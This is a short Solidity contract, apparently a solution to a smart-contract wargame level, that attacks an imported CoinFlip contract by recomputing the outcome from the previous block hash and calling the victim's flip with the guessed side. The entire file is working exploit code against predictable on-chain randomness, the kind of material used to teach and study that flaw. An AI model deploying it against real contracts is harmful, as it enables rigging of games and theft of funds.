// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './coin.sol';

contract CoinFlipAttack {

    CoinFlip public victimContract;
    uint FACTOR =57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _victimContractAddr) public {
        victimContract = CoinFlip(_victimContractAddr);
    }
    
    function flip() public returns (bool){
        uint256 blockvalue = uint256(blockhash(block.number-1));
        uint256 coinFlip = uint256(blockvalue/FACTOR);
        bool side = coinFlip ==1? true : false ;

        victimContract.flip(side);
    }


}
